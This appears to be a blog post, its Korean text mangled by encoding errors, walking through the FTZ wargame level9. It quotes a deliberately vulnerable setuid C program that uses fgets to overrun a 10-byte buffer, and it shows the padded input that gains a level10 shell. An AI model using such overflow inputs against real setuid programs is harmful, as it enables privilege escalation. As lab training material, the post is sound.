---
title: "[FTZ] level9 í’€ì´"
categories:
  - ftz
tags:
  - FTZ
toc: true
toc_sticky: true
toc_label: "level9 í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/ftz.png
---

ğŸ’¡ FTZ level9 í’€ì´
{: .notice--warning}


# ë¬¸ì œ

ê³„ì • : level9/apple

**hint**
```c
ë‹¤ìŒì€ /usr/bin/bofì˜ ì†ŒìŠ¤ì´ë‹¤.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(){

  char buf2[10];
  char buf[10];

  printf("It can be overflow : ");
  fgets(buf,40,stdin);

  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }

}

ì´ë¥¼ ì´ìš©í•˜ì—¬ level10ì˜ ê¶Œí•œì„ ì–»ì–´ë¼.
```

# í’€ì´

bofë¥¼ ì´ìš©í•´ì„œ buf2ì— ë°ì´í„°ê°€ bufë°ì´í„°ë¥¼ ë®ì–´ì¨ì•¼ í•©ë‹ˆë‹¤.

ìš°ì„  buf2ì™€ buf ê°€ ê°ê° ëª‡ë°”ì´íŠ¸ ë§Œí¼ í• ë‹¹ ë°›ì•˜ëŠ”ì§€ í™•ì¸ í•©ë‹ˆë‹¤.

gdbë¥¼ ì‹¤í–‰í•˜ë ¤ê³  í•˜ë‹ˆ, permission deniedê°€ ë‚˜ì˜µë‹ˆë‹¤. 

ê·¸ëƒ¥ ëª‡ê°œ ì•ˆë˜ë‹ˆ brute forceë¥¼ í•´ë´…ë‹ˆë‹¤.

ë°ì´í„°ì˜ í• ë‹¹ì€ 4ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ ë˜ê¸° ë•Œë¬¸ì— 12, 16 , 20 .. ì´ë ‡ê²Œ ìˆ˜í–‰ì„ í•©ë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ 16ê°œì˜ Aë¡œ ë®ì–´ì“´ ë’¤ì— ì‰˜ì„ íšë“í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

```sh
[level9@ftz level9]$ /usr/bin/bof
It can be overflow : AAAAAAAAAAAAgo
[level9@ftz level9]$ /usr/bin/bof
It can be overflow : AAAAAAAAAAAAAAAAgo
Good Skill!
[level10@ftz level9]$ id
uid=3010(level10) gid=3009(level9) groups=3009(level9)

```

![image](https://user-images.githubusercontent.com/33647663/167300634-e8336996-5095-4d2b-b04d-422a99991637.png)


